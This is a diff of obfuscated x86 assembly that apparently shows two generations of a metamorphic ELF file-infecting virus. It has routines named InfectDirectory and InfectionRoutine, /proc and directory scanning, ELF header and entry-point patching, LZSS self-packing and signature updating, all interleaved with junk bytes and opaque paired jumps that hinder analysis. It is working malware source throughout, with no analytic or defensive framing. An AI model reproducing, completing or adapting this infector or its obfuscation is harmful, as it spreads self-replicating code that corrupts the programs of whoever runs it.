+    ret
+    jmp         IsELFComplete
+..@rvjagSC3Mr95:
+    sub         r5, 1
+    jb          ..@z5p2uJ1zNGu7
+    jae         ..@z5p2uJ1zNGu7
+..@Iht8Y88RV8O2:
+    xor         r2, r2
     xor         r3, r3
-    xor         r4, r4
-    je          ..@YSJsXRM0YsSr
-    jne         ..@YSJsXRM0YsSr
-..@VnxmuW91zIFI:
-    and         ax, 1111b
+    jmp         $+3
+db 0xbd
+    jmp         ..@qt1I7nDQRdCR
+..@EYt5me9UaoIq:
+    mov         QWORD [r5+file.fileptr], rax
+    jmp         $+3
+db 0xde
+    je          ..@FH0BkZoIzYyv
+    jne         ..@FH0BkZoIzYyv
+..@zuUZzEtE1oEc:
+    mov         rdi, m6
     jmp         $+5
-db 0x70, 0x5e, 0x1b
-    js          ..@hvkFPDOlHn3w
-    jns         ..@hvkFPDOlHn3w
-..@4ZDE2zgVmwnW:
-    mov         r2, r5
-    call        Strcpy
-    jmp         $+4
-db 0xfa, 0x05
-    jmp         ..@6GxFbQQGqUyA
-..@bYKHuv7XEbYz:
-    mov         r3, _signature.startsize
-    call_vsp    Strncmp
-    test        rax, rax
-    jmp         $+5
-db 0x78, 0x27, 0xb6
-    jmp         ..@xggPZb98iCPw
-..@K6v6N0zeZPwf:
-    lea         r1, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
-    call        IsNum
-    js          ..@VrwBPl3fK9S1
-    jns         ..@VrwBPl3fK9S1
-..@BLtOfbe28x60:
-    mov         WORD [rsp+_NBF_OFF.index], r2w
-    mov         QWORD [rsp+_NBF_OFF.file], r1
-    jmp         $+3
-db 0x53
-    jmp         $+4
-db 0x00, 0x9e
-    js          ..@Gi66SrK0YdF0
-    jns         ..@Gi66SrK0YdF0
-..@TSkbAGau9jDj:
-    lea         r2, [rsp+_PROC_OFF.buffer+0x6]
-    jl          ..@4BKr9WgzzW1S
-    jge         ..@4BKr9WgzzW1S
-..@FTK5uvvRRGNV:
-%ifdef X86_64
-    xor         rdx, rdx
-    xor         r10, r10
-    xor         r9, r9
-%endif
-    jmp         $+4
-db 0x0c, 0x95
-    jl          ..@ffL7a9gg9ukD
-    jge         ..@ffL7a9gg9ukD
-..@ju1XxPHbn5gb:
-    jmp         ..@euuEa0fW43Iv
-    jmp         $+3
-db 0x07
-    jmp         $+5
-db 0xb0, 0xcd, 0x54
-    js          ..@ZUdwnS592kxe
-    jns         ..@ZUdwnS592kxe
-..@I6dQOwxJdLxi:
-    cmp         eax, 0x03
-    jl          ..@yPMZPERcrcUG
-    js          ..@cOHdfQIPapmv
-    jns         ..@cOHdfQIPapmv
-..@4dnxtYuESPaq:
-    jl          ..@8rJYtOwNTCCE
-    jmp         $+3
-db 0x1f
-    jb          ..@a9lbKICOBZ5r
-    jae         ..@a9lbKICOBZ5r
-..@aNoHtXbk9uHY:
-    push        r2
-    push        r3
-    jmp         $+3
-db 0xbb
-    js          ..@TTWJ4mnxLXV6
-    jns         ..@TTWJ4mnxLXV6
-..@8HixdbI99e65:
-    jmp         ..@Gd6cFRm7kHZN
-    jmp         $+4
-db 0xe9, 0x9d
-    je          ..@HUhjopsW1qpk
-    jne         ..@HUhjopsW1qpk
-..@ual95S5jRqtH:
-    jmp         ..@ej65ZzKjvLsa
-    jmp         $+5
-db 0xd7, 0x0f, 0x1f
-    jb          ..@Ay0Bf7Fn2y08
-    jae         ..@Ay0Bf7Fn2y08
-..@MgjANKaPl1LN:
-    pop         r3
-    jb          ..@YUarNTrxk736
-    jae         ..@YUarNTrxk736
-..@Wr9LCKKCOVq5:
-%ifdef X86_32
-    int         0x80
-%endif
-    jmp         $+4
-db 0x12, 0x8c
-    jmp         ..@PaPGV0N0tEd7
-..@vs2p6tc4FMs5:
-    sub         rsp, _PROC_OFF_size
-    VAR         packed, procdir
-    mov         QWORD [rsp+_PROC_OFF.dirname], r5
-    jmp         $+4
-db 0xb4, 0x7f
-    jmp         ..@Cv8AofGoq972
-..@cFzLQnUX2T44:
-    call        Strcpy
-    mov         BYTE [r1], 0x00
-    jmp         $+4
-db 0xd1, 0x4d
-    js          ..@aF6hf4UB6MPi
-    jns         ..@aF6hf4UB6MPi
-..@WaEEIpCaaTmf:
-    jnz         ..@6iHaSqzKkkPE
-    jmp         $+3
-db 0xa6
-    jmp         ..@mV1A4zx0WmbP
-..@V9RWFNwAZLeP:
-    mov         rcx, signature_len
-    jb          ..@w6G98YpLK78T
-    jae         ..@w6G98YpLK78T
-..@OaQhCKndHfvF:
-    cmp         BYTE [rsp+_LZSSE_OFF.character], al
-    jmp         $+3
-db 0x0d
-    js          ..@40pJEMZnuRUV
-    jns         ..@40pJEMZnuRUV
-..@HUhjopsW1qpk:
-    mov         rax, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
-    add         rax, QWORD [rsp+_VADDR_OFF.tmp_offset]
-    mov         r3, rax
-    jmp         $+3
-db 0x38
-    jmp         $+5
-db 0xc0, 0xaa, 0x2c
-    jmp         $+4
-db 0x4d, 0xa9
-    jb          ..@Y0SfeYiv2Pdo
-    jae         ..@Y0SfeYiv2Pdo
-..@9KS8sBPXF7qt:
-    xor         rax, rax
-    jmp         ..@S5FKs9k29EgY
-..@bNjy9EnoKbD9:
-%ifdef X86_64
-    syscall
-%endif
-    jmp         $+3
-db 0x1f
-    jmp         $+3
-db 0xba
-    jmp         $+3
-db 0x5a
-    je          ..@eY1K1M5PBGMx
-    jne         ..@eY1K1M5PBGMx
-..@D73XcWd2C3dT:
-    mov         r5, r3
-    mov         r3, rax
-    jb          ..@QZL7KSgZ8ywh
-    jae         ..@QZL7KSgZ8ywh
-..@awGIg6lC4D2W:
-    push        r5
-    cmp         r3, 0x00
-    jmp         $+3
-db 0x00
-    jmp         $+3
-db 0xac
-    jmp         $+3
-db 0xe5
-    jb          ..@omUPQJ9iuqkO
-    jae         ..@omUPQJ9iuqkO
-..@b62JGoGb3HNZ:
-    GGLOBAL     _signature
-    mov         r1, r5
-    jmp         ..@bYKHuv7XEbYz
-..@Q4m9ni0Rx1mo:
-    mov         r2, QWORD [r1+file.filesize]
-    cmp         rax, r2
-    jne         ..@4BxzAjnCWS4s
-    jmp         ..@2phrMpUTt3jh
-..@s3CQhgvYrxm3:
-    mov         QWORD [rsp+_PROC_OFF.dirindex], 0x00
-    jmp         $+3
-db 0x9b
-    jmp         ..@Qz79efy2Pb28
-..@ybxGIdtMjje3:
-    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
-    jmp         $+4
-db 0x18, 0x84
-    jmp         ..@CSjfQY8M95dR
-..@lFqLzxzmaoAy:
-    call        IsELFComplete
-    test        al, al
-    jnz         ..@lsrxRNxO1dmY
-    jb          ..@Z3gDqWEZIF10
-    jae         ..@Z3gDqWEZIF10
-..@ehFobrxPjNph:
-    xor         rax, rax
-    xor         rdi, rdi
-    je          ..@FU9VppnTW1I7
-    jne         ..@FU9VppnTW1I7
-..@7hzF7QHvjdP4:
-    mul         rbx
-    mov         rdi, QWORD [rsp+_DYNPIE_OFF.sh_ptr]
-    jl          ..@dujU6Me7FpQR
-    jge         ..@dujU6Me7FpQR
-..@QrDxmwxg0xUL:
-%ifdef X86_64
-    mov         eax, SYS_MMAP
-%endif
-    jmp         ..@bNjy9EnoKbD9
-..@rQxax0Ln1Sbl:
-    mov         QWORD [r2+p_h.p_filesz], r4
-    jmp         $+4
-db 0x07, 0xa4
-    jmp         $+5
-db 0x27, 0xbe, 0x9c
-    jb          ..@3gXhU5QImkdC
-    jae         ..@3gXhU5QImkdC
-..@Z3gDqWEZIF10:
-    mov         rax, 1
-    jmp         $+4
-db 0xf5, 0x99
-    js          ..@z0xXHDU3QKMQ
-    jns         ..@z0xXHDU3QKMQ
-..@OX1iWJ3FaBHB:
-    mov         r1, r5
-    jmp         ..@77PdTXrq5sYZ
-..@9HzX29A27Syp:
+db 0xa2, 0x76, 0xe2
+    jb          ..@j3OxBzfEmxF6
+    jae         ..@j3OxBzfEmxF6
+..@Gh6qy84A1IRn:
     call        Strcpy
     mov         BYTE [r1], '/'
-    add         r1, 1
-    jmp         $+5
-db 0x24, 0xe7, 0x31
-    jmp         $+5
-db 0x90, 0x83, 0x01
-    jmp         $+4
-db 0x19, 0xcb
-    jmp         $+5
-db 0xd8, 0x7f, 0x0f
-    jmp         $+4
-db 0x76, 0xb5
-    jb          ..@V3sEezbuAyAb
-    jae         ..@V3sEezbuAyAb
-..@rKunHPjrEW4X:
-    jl          ..@3uVNz1ir4sHk
-    jb          ..@RWWF6JqWbrHn
-    jae         ..@RWWF6JqWbrHn
-..@VtZFTVR86yx7:
-    sub         r5, 1
-    jmp         $+3
-db 0xa0
-    je          ..@QLDyIRAQVtcS
-    jne         ..@QLDyIRAQVtcS
-..@DcfaDhhGaAcZ:
-    lea         r1, [rsp+_PROC_OFF.dirbuf+r4]
-    jb          ..@BIOGBd0jmG7v
-    jae         ..@BIOGBd0jmG7v
-..@tdRzVJRMCVmT:
-    call        Strcpy
-    js          ..@TpGHkCVS9LTD
-    jns         ..@TpGHkCVS9LTD
-..@4kRuFTYRuJR5:
-    sub         dl, cl
-    cmp         dl, BYTE [rsp+_LZSSE_OFF.match_len]
-    jle         ..@y5oqMFwavmZD
-    jmp         ..@Egs1JIkX3bSo
-..@gd98rcYricTG:
-    mov         r5, r1
-    jl          ..@UGIplteGu2Gb
-    jge         ..@UGIplteGu2Gb
-..@ZipjsXgsz6NS:
-    xor         rax, rax
-    jmp         ..@nyld1e4PlQBr
-..@SwFTvu0xO5k2:
-    shr         dx, 0x4
-    add         ecx, 1
-    jmp         $+3
-db 0x47
-    jmp         $+3
-db 0xf7
-    jmp         ..@Rkr4BI3bEH27
-..@binAT9m3fVDc:
-    rep         stosb
-    jl          ..@mCmN0FkSYNDw
-    jge         ..@mCmN0FkSYNDw
-..@zmOSneguy62o:
-    mov         ax, WORD [r1]
-    mov         WORD [rsp+_DYNPIE_OFF.shentsize], ax
-    js          ..@HRMWWCOyFdG7
-    jns         ..@HRMWWCOyFdG7
-..@dBBk0JSlKssF:
-    and         r2, 0x00ffffff
-    cmp         r2d, '../'
-    jmp         $+3
-db 0xf7
-    jl          ..@Wueh5ufWGc4A
-    jge         ..@Wueh5ufWGc4A
-..@67pC09vXOZ3P:
-%ifdef X86_32
-    mov         ecx, DWORD [edi+file.filesize]
-    mov         edx, 11b
-    mov         esi, 0x01
-%endif
-    jmp         $+5
-db 0xf4, 0xb7, 0x04
-    jb          ..@m4dy8ADf367O
-    jae         ..@m4dy8ADf367O
-..@FLCq9KmgNSsB:
-    mov         r1, QWORD [r5+file.filename]
-    cmp         BYTE [r1], '/'
-    jne         ..@lsrxRNxO1dmY
-    jb          ..@NF0lXMBniLbp
-    jae         ..@NF0lXMBniLbp
-..@fiQcplWSg65O:
-    mov         r1, QWORD [r5+file.fileptr]
-    mov         r3, r2
-    jmp         $+3
-db 0x6c
-    jmp         ..@DqWdiCKqXrZx
-..@yfYzutYWRqnJ:
-    ret
-    jmp         ..@lsrxRNxO1dmY
-..@SI1lEJhUeuOZ:
-    add         QWORD [rsp+_PROC_OFF.dirindex], rax
-    add         r4, rax
-    cmp         r4, QWORD [rsp+_PROC_OFF.dirnread]
-    je          ..@rKunHPjrEW4X
-    jne         ..@rKunHPjrEW4X
-..@EPCScpJhypn6:
-    add         rcx, 2*bytes
-    jmp         $+3
-db 0xfe
-    jl          ..@xqm2fJirjvJJ
-    jge         ..@xqm2fJirjvJJ
-..@cOHdfQIPapmv:
-    mov         DWORD [rsp+_INFDIR_OFF.dirfd], eax
-    jmp         $+4
-db 0xf9, 0x49
-    jmp         $+3
-db 0x5c
-    jmp         $+3
-db 0xb6
-    jb          ..@nrmcUzOm62AS
-    jae         ..@nrmcUzOm62AS
-..@xm5M6TpNyPKr:
-    xor         rcx, rcx
-    jmp         ..@s7mNbStXFytJ
-..@2phrMpUTt3jh:
-    xor         rax, rax
-    jmp         $+3
-db 0xd9
-    jmp         $+4
-db 0x15, 0x0b
-    jmp         $+5
-db 0x5e, 0x77, 0x3d
-    jl          ..@WKNafgZ3kLCX
-    jge         ..@WKNafgZ3kLCX
-..@xPj5oJzMZJBF:
-    mov         QWORD [rsp+_VADDR_OFF.tmp_offset], 0
-    jmp         ..@Zcgs1e5yGNUj
-..@xgOe7JTb2H9h:
-    OFILE       [r1], 0x10000
-    js          ..@I6dQOwxJdLxi
-    jns         ..@I6dQOwxJdLxi
-..@FoKo9L151E7b:
-    call        MemMove
-    je          ..@V9RWFNwAZLeP
-    jne         ..@V9RWFNwAZLeP
-..@WsiYH3eT8f0j:
-    sub         r4, QWORD [r1+e_h.e_entry]
-    jmp         $+3
-db 0xc3
-    jmp         ..@CbjOeNs2uB8E
-..@dujU6Me7FpQR:
-    add         rdi, rax
-    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
-    jmp         $+4
-db 0xbb, 0xaf
-    jl          ..@vBLtEMuL1tY6
-    jge         ..@vBLtEMuL1tY6
-..@N9Mo6es9etec:
-    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x0
-    mov         BYTE [rsp+_LZSSE_OFF.match_pos], 0x1
-    lea         rdi, [rsp+_LZSSE_OFF.buffer]
-    jb          ..@ZipjsXgsz6NS
-    jae         ..@ZipjsXgsz6NS
-..@Jf3YEJY80kAR:
-    call_vsp    Strlen
-    add         r5, rax
-    jmp         $+4
-db 0xc9, 0xfa
-    je          ..@r906VBpOCNL4
-    jne         ..@r906VBpOCNL4
-..@usm1spK8ILz6:
-    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
-    jmp         ..@COdNIXAjfRSb
-..@RhwAFbsQk17z:
-    xor         r2, r2
-    jb          ..@IQENnfnKVMo5
-    jae         ..@IQENnfnKVMo5
-..@X98vU0MVddqW:
-    sub         rsi, 1
-    jmp         $+5
-db 0xe8, 0xa9, 0x63
-    js          ..@C0z6esBUdcb6
-    jns         ..@C0z6esBUdcb6
-..@6f9XKeKC3fyE:
-    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x1
-    je          ..@azRmhjqbwF9z
-    jne         ..@azRmhjqbwF9z
-..@WGlI1NXXqwSY:
-    cmp         r5, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
-    jle         ..@ioyWjQ5mcaae
-    jmp         $+5
-db 0xbf, 0xa8, 0x74
-    js          ..@5DXo23lJOqIw
-    jns         ..@5DXo23lJOqIw
-..@tuuixxHLb5Zy:
-    rep         movsb
-    jmp         ..@616NPtyqPn63
-..@QgQdJMyrhk7a:
+    js          ..@zSgAQGSpaPx3
+    jns         ..@zSgAQGSpaPx3
+..@W82JEt0LdV91:
+    add         rsp, _DYNPIE_OFF_size
     pop         r2
-    cmp         rax, 0x00
-    jmp         $+4
-db 0xd9, 0x97
-    jb          ..@FiKPaav11RK6
-    jae         ..@FiKPaav11RK6
-..@XetoShgGz7aW:
-    xor         r1, r1
-    jl          ..@6RoGOIM2nDHk
-    jge         ..@6RoGOIM2nDHk
-..@A9VKNpFY7riK:
-    mov         r2, vsp
-    jmp         $+4
-db 0xe0, 0xf9
-    jmp         ..@xC6QOrzoOLUT
-..@U4LC03WW1yCd:
-    ret
+    jl          ..@Kqr5qSPMZRgl
+    jge         ..@Kqr5qSPMZRgl
+..@kmMqVhldp3u8:
+    jz          ..@YGvCtyV1laIX
+    cmp         BYTE [r1], 0x30
+    jl          ..@TP3zax1Pdf2L
     jmp         $+3
-db 0x32
-    jmp         $+5
-db 0xe2, 0xd3, 0x07
+db 0xe5
+    js          ..@3cFjwW8DaFMl
+    jns         ..@3cFjwW8DaFMl
+..@MtBwkrQvV0d1:
+    call        NonBinaryFile
     jmp         $+4
-db 0x8c, 0x82
-    jmp         $+3
-db 0xaf
-    jmp         DYNPIEValidation
-..@ERlzDxHmndSk:
-    xor         rdx, rdx
-    mov         dl, BYTE [rsp+_LZSSE_OFF.cmp_len]
-    js          ..@4kRuFTYRuJR5
-    jns         ..@4kRuFTYRuJR5
-..@OaEDdqOW903L:
-    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
-    jmp         ..@FV1tqsRXDtun
-..@Cv8AofGoq972:
-    mov         r1, r5
-    js          ..@cCPucnqVfrIj
-    jns         ..@cCPucnqVfrIj
-..@TpGHkCVS9LTD:
-    lea         r2, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
-    call        Strcpy
-    jmp         $+4
-db 0xd1, 0xf1
-    jmp         ..@eS6kJkMCOlAt
-..@G8J3qwFLkxsZ:
-    or          QWORD [r1+e_h.e_entry], 1b
-    jmp         $+3
-db 0x55
-    jmp         $+4
-db 0x30, 0xc2
-    jmp         $+3
-db 0x9a
-    jmp         ..@7rDilQGfzbZy
-..@lywvGzYgsaJ5:
-    cmp         eax, 0x00
-    jl          ..@nRtImfModyJv
-    je          ..@9TuPDvn8qdiK
-    jmp         $+3
-db 0x34
-    jl          ..@wzl5lYJQvsar
-    jge         ..@wzl5lYJQvsar
-..@VrwBPl3fK9S1:
-    test        eax, eax
-    jz          ..@ILFuuzyNwwVx
-    jmp         $+5
-db 0x08, 0xe9, 0x3d
-    jmp         $+4
-db 0x8f, 0x59
-    jl          ..@pptnV0zp6suR
-    jge         ..@pptnV0zp6suR
-..@rchis7iqljwr:
-    mov         ax, WORD [r5+e_h.e_shentsize]
-    je          ..@eG0Mr33tpY9f
-    jne         ..@eG0Mr33tpY9f
-..@FY6pjiMu0i8B:
-    cmp         BYTE [r1], DT_DIR
-    jne         ..@ILFuuzyNwwVx
-    jl          ..@K6v6N0zeZPwf
-    jge         ..@K6v6N0zeZPwf
-..@JVcwtL453T2T:
-    add         WORD [rsp+_LZSSE_OFF.w_index], ax
-    jmp         $+4
-db 0x1f, 0x52
-    jmp         ..@GBEKURlDXUiW
-UpdateSignature:
-    jmp         ..@2u73pfP6UK9f
-..@TLgFmr4pt3Wm:
-    mov         al, BYTE [rdi]
-    mov         BYTE [rsp+_LZSSE_OFF.character], al
-    mov         bx, WORD [rsp+_LZSSE_OFF.la_index]
-    jl          ..@esCw0L3e83I2
-    jge         ..@esCw0L3e83I2
-..@ePcDwQE5E4H9:
-    mov         r3, r1
-    sub         r3, PADDING
-    mov         r2, original_virus_len-non_packed_len
-    jmp         $+4
-db 0xa0, 0x47
-    jmp         ..@Jj82UGXYo1aK
-..@4BxzAjnCWS4s:
-    mov         rax, 1
-    jb          ..@rD2cXF7ZO4YY
-    jae         ..@rD2cXF7ZO4YY
-InfectDirectory:
-    jmp         ..@rSOURfNrjQur
-MemMove:
-    jmp         ..@Hdj4TJLX1Eyl
-..@Gd6cFRm7kHZN:
-    mov         rax, r2
-    movzx       r3, WORD [r1+e_h.e_phentsize]
-    mul         r3 
-    jmp         $+5
-db 0x55, 0x37, 0x14
-    jmp         ..@VTPxk9lykrYx
-..@PUOjOK1p4ttG:
-    ret
-    js          IsNum
-    jns         IsNum
-..@ihwnYo1hhq3t:
-    cmp         BYTE [r1], 0x0
-    js          ..@js4SGjaxQUky
-    jns         ..@js4SGjaxQUky
-..@mCmN0FkSYNDw:
+db 0xa0, 0x91
+    jmp         ..@ULGNtgTzUOPR
+..@7syp8lfBLtw1:
+    jz          ..@F5GJP0OSwuvv
+    jb          ..@8Zi0pp2FyfWv
+    jae         ..@8Zi0pp2FyfWv
+..@90lndXXin7rh:
+    jmp         ..@W82JEt0LdV91
+    jmp         ..@9mXnQCpM1lZS
+..@R4FxM6IERCtl:
     xor         rax, rax
-    xor         r2, r2
-    mov         r1, m6
-    jl          ..@Q38adMME29NV
-    jge         ..@Q38adMME29NV
-WORDToDWORDASCII:
-    jmp         ..@l46LJYz4unQo
-..@glpZTnE4Q9X4:
-    mov         r1, QWORD [r5+file.fileptr]
-    cmp         DWORD [r1], 0x464c457f
-    jne         ..@FLCq9KmgNSsB
-    jb          ..@FsmAu6mYsZ8L
-    jae         ..@FsmAu6mYsZ8L
-..@ojYYcruAo1CH:
-    test        rax, rax
-    jmp         ..@5dFqxetLkZ7u
-..@2Ol2331izW8t:
-    mov         DWORD [rsp+_PROC_OFF.filefd], eax
-    RFILE       rax, [rsp+_PROC_OFF.buffer], 0x100
-    jmp         $+3
-db 0x95
-    js          ..@m2pGt0M8bhFg
-    jns         ..@m2pGt0M8bhFg
-..@TTWJ4mnxLXV6:
-    call        GetNewProgramVaddr
-    pop         r3
-    je          ..@QgQdJMyrhk7a
-    jne         ..@QgQdJMyrhk7a
-..@C0WeQk6sV2IE:
-    sub         rsp, _DYNPIE_OFF_size
-    jmp         $+5
-db 0x82, 0xd1, 0x78
-    je          ..@9KS8sBPXF7qt
-    jne         ..@9KS8sBPXF7qt
-..@LMDl7KmZGNiK:
-    mov         WORD [rsp+_LZSSE_OFF.w_index], 0x0000
-    jmp         ..@ehFobrxPjNph
-..@f8ZYfPsWGEfr:
-    jne         ..@EPCScpJhypn6
-    jb          ..@79Y67X3uJrj6
-    jae         ..@79Y67X3uJrj6
-..@lsrxRNxO1dmY:
-    xor         rax, rax
-    jmp         $+5
-db 0xeb, 0xca, 0xf2
-    jmp         $+4
-db 0x37, 0x77
-    je          ..@GX5fOqx7jm58
-    jne         ..@GX5fOqx7jm58
-..@GX5fOqx7jm58:
     ret
     je          NonBinaryFile
     jne         NonBinaryFile
-..@z0xXHDU3QKMQ:
-    ret
-    jmp         $+4
-db 0xcb, 0xa8
-    jmp         ..@FLCq9KmgNSsB
-..@s5r1kNfFqhEI:
-    mov         ecx, (WINDOW_LENGTH+LOOKAHEAD_LENGTH)
-    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
+..@s31trFTZGrWP:
+    sub         rsi, m6
+    mov         DWORD [rdi], esi
+    jmp         ..@q9eb5rf39ywp
+InfectionRoutine:
+    jmp         ..@t3O3ODVmZ4pz
+..@dhmtsbVaoyYs:
+    GGLOBAL     _signature
+    mov         r1, r5
+    mov         r3, _signature.startsize
+    jl          ..@8Pl9xDwNEDHe
+    jge         ..@8Pl9xDwNEDHe
+WORDToDWORDASCII:
+    jmp         ..@ziSSMFPK2cam
+..@vNTHFHVJc4Ve:
+    or          QWORD [r1+e_h.e_entry], 1b
+    jmp         ..@0oWYtjhg8wT9
+..@QeGQiCbTGazN:
+    jle         ..@qKg4vdRgo52V
+    jmp         ..@lAgMhlZTPycy
+..@T8hC4TMN2f7u:
+%ifdef X86_32
+    mov         edi, r1
+%endif
     jmp         $+3
-db 0xb5
-    jl          ..@t2ICBlD3q23b
-    jge         ..@t2ICBlD3q23b
-..@NNyIiXiAxQl7:
+db 0x7a
+    jmp         $+3
+db 0xb1
+    js          ..@DAodRufKxsoa
+    jns         ..@DAodRufKxsoa
+..@gdDKzjoZgtOS:
+    rep         stosb
+    jmp         $+3
+db 0x5d
+    jmp         $+5
+db 0xf5, 0xf7, 0x4f
+    jmp         $+4
+db 0x94, 0x19
+    js          ..@Rd58TJuBDh03
+    jns         ..@Rd58TJuBDh03
+..@UqoHUG7h3iVp:
+    add         r2, r1
+    jmp         ..@RZXLyxaffE48
+..@FcWd8IQOLEut:
+    and         r2, 1b
+    jmp         $+5
+db 0x00, 0x31, 0xd6
+    jl          ..@l31929toBcuu
+    jge         ..@l31929toBcuu
+..@5pK2K35EwNbI:
+    add         m7, rax
+    js          ..@zuUZzEtE1oEc
+    jns         ..@zuUZzEtE1oEc
+..@mZiVHHiV3xzU:
     mov         r3, rax
-    call_vsp    Strncmp
-    test        ax, ax
+    and         r3, 0xfff 
+    mov         rbx, 0x1000
+    jmp         ..@PcSPjRb5do1i
+..@IdIyO6AfnuAn:
+    and         ax, 1111b
+    jmp         ..@eEJkBNoajoIV
+..@KbYcrJwYLgG3:
+    add         rdi, rcx
+    add         rsi, rcx
+    jmp         ..@xgrqprr9QNjF
+..@VB1JQf5UfmqE:
+    shl         edi, 0x8
+    jmp         ..@QO2ioFcHPdap
+..@PIKL46ekOib4:
+    jle         ..@oz0w6dKg0d2f
     jmp         $+4
-db 0x89, 0x8b
+db 0x8a, 0x4f
+    js          ..@ysMlpUVNjnx6
+    jns         ..@ysMlpUVNjnx6
+..@tt5pTdpoMGbi:
+%ifdef X86_32
+    mov         ecx, DWORD [edi+file.filesize]
+%endif
     jmp         $+5
-db 0x71, 0x1b, 0x86
-    jmp         $+5
-db 0x8e, 0x23, 0x3e
-    jmp         ..@eKzn1BW5MpxW
-..@XoZL0fvr8HJX:
-    mov         QWORD [rsp+_INFDIR_OFF.dirname], r1
+db 0xbc, 0x8a, 0xc8
+    jmp         ..@tp01EptcftdQ
+..@Niqdd0lU3Zu5:
+    mov         r1, r4
+    mov         rax, [r5+file.filesize]
     jmp         $+4
-db 0xad, 0x79
-    jmp         ..@xgOe7JTb2H9h
-..@y4NQukbkwPeO:
-    mov         BYTE [rdi], al
+db 0x00, 0x7a
     jmp         $+3
-db 0x66
-    jb          ..@He2bMMJclM0I
-    jae         ..@He2bMMJclM0I
-..@esCw0L3e83I2:
-    jmp         ..@y5oqMFwavmZD
-    jmp         ..@POieD0xhJdu5
-..@3hsRmOzXhkpT:
-    ret
-    jmp         MemMove
-..@fNSudO0Jcbl5:
-    call_vsp    ExitProgram
-    jmp         ..@Tz071gMscT7I
-..@azRmhjqbwF9z:
-    xor         rax, rax
-    xor         rcx, rcx
-    xor         rbx, rbx
+db 0x80
+    jb          ..@SjAA1cjKRDba
+    jae         ..@SjAA1cjKRDba
+..@7jK9ru52YNGT:
+%ifdef X86_32
+    xor         eax, eax
+%endif
     jmp         $+4
-db 0x88, 0xd3
-    jmp         ..@lwMXdA0hp9F9
-..@5DXo23lJOqIw:
-    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], r5
-    js          ..@ioyWjQ5mcaae
-    jns         ..@ioyWjQ5mcaae
-..@kz9sDqQCameL:
-    mov         ax, WORD [r1]
-    mov         WORD [rsp+_DYNPIE_OFF.shnum], r1w
-    je          ..@QIFNOHBegV8C
-    jne         ..@QIFNOHBegV8C
-..@bBmaJM5Nnte9:
+db 0xdb, 0x7d
+    je          ..@uOC73yUAKMYL
+    jne         ..@uOC73yUAKMYL
+..@0pDGmNIMMlxe:
+    ret
+    jmp         $+5
+db 0x26, 0x55, 0xc4
+    jmp         $+3
+db 0x38
+    jb          WORDToDWORDASCII
+    jae         WORDToDWORDASCII
+..@xY73kzQhpMQT:
+    add         rsi, WINDOW_LENGTH
+    rep         movsb
+    sub         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH
+    je          ..@kDdjOSsxIOp6
+    jne         ..@kDdjOSsxIOp6
+..@hvoRkrj9Z3zl:
+    ret
+    jmp         $+4
+db 0xce, 0xd0
+    jmp         $+4
+db 0xec, 0x68
+    jb          UpdateSignature
+    jae         UpdateSignature
+..@gL9qOJf82HFz:
+    jle         ..@F5GJP0OSwuvv
+    mov         DWORD [rsp+_PROC_OFF.filefd], eax
+    RFILE       rax, [rsp+_PROC_OFF.buffer], 0x100
+    jmp         ..@YGijnXnHzcof
+..@M2BZ7QA3lU5h:
+    lea         r1, QWORD [rsp+_INFFILE_OFF.file]
+    call        FileValidation
+    cmp         rax, 0x02
+    jmp         $+5
+db 0xe0, 0xdc, 0x75
+    jmp         $+5
+db 0x73, 0x70, 0xab
+    jmp         $+4
+db 0x76, 0xbc
+    jl          ..@e051e89yAKXG
+    jge         ..@e051e89yAKXG
+..@Ny0Pgk64lueE:
+    mov         r2, signature_len
+    call        AddSizeMappedFile
+    jmp         ..@X2XK3cqDiXZ3
+..@FDTmGGmiDg17:
+    jnz         ..@TrY8TMOOygZR
+    jl          ..@My679AkxlRTY
+    jge         ..@My679AkxlRTY
+..@WX0eesBnV3cs:
+%ifdef X86_64
+    mov         eax, SYS_MMAP
+%endif
+    jmp         $+3
+db 0x0e
+    jmp         $+5
+db 0x1a, 0x57, 0x74
+    jmp         $+4
+db 0xa1, 0x73
+    jmp         ..@J4AoCAjHY5Y3
+..@nTxJtYmQhjW8:
+    call        WORDToDWORDASCII
+    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
+    jmp         $+3
+db 0xce
+    js          ..@rcCjuVt271rR
+    jns         ..@rcCjuVt271rR
+..@RLw7VHd5KSgN:
+    lea         r1, [rsp+_INFDIR_OFF.buffer]
+    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
+    jmp         $+3
+db 0xb4
+    jmp         $+3
+db 0xa1
+    js          ..@Gh6qy84A1IRn
+    jns         ..@Gh6qy84A1IRn
+..@P0qnMkDF7Z4Q:
+    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
+    jmp         $+4
+db 0xcf, 0x8a
+    jmp         $+4
+db 0x2c, 0x99
+    je          ..@EwwXMTBBWSfX
+    jne         ..@EwwXMTBBWSfX
+..@91I78QCFUTJy:
+    add         r1, non_packed_len+PADDING
+    mov         r3, r1
+    sub         r3, PADDING
+    jmp         $+4
+db 0x14, 0xe4
+    jmp         ..@rzmYlC2dkt0q
+..@F5fl1l2ePLuS:
+    jmp         ..@vPMrJesYLSXe
+    je          ..@vPMrJesYLSXe
+    jne         ..@vPMrJesYLSXe
+..@NLoRyrDfFi5i:
+    jmp         ..@QPGIokYsnVu8
+    jmp         ..@eDvIPiZixItI
+..@u2671wA8w3oE:
+    add         rsi, QWORD [rdi+s_h.sh_offset]
+    jmp         $+3
+db 0xef
+    jmp         $+5
+db 0xcf, 0x39, 0xd2
+    je          ..@AT4Mi9T5InEx
+    jne         ..@AT4Mi9T5InEx
+..@Y7NtDm9eoh4u:
+    mov         QWORD [rsp+_DYNPIE_OFF.ptr], r1
+    jb          ..@w8VR0C2bgnQF
+    jae         ..@w8VR0C2bgnQF
+..@4bFPNOvGMuoE:
+    mov         QWORD [r2+p_h.p_paddr], r3
